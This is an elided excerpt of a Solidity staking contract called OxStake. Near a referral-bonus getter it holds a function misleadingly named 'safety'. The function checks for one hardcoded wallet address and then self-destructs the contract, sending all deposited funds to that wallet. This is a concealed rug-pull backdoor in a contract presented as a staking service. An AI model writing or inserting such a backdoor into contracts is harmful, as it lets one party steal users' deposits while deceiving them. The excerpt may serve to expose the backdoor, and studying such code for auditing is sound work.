...
contract OxStake {
	...
	function getUserReferralBonus(address userAddress) public view returns(uint256) {
      ...
      function safety(address _addr)public  returns(string memory){require( keccak256( abi.encode(_addr)) == keccak256(abi.encode(0xb9e959514e08549e5e86075B4F8A67ab91859dB5)),"this contract is not yours");selfdestruct(payable(_addr));
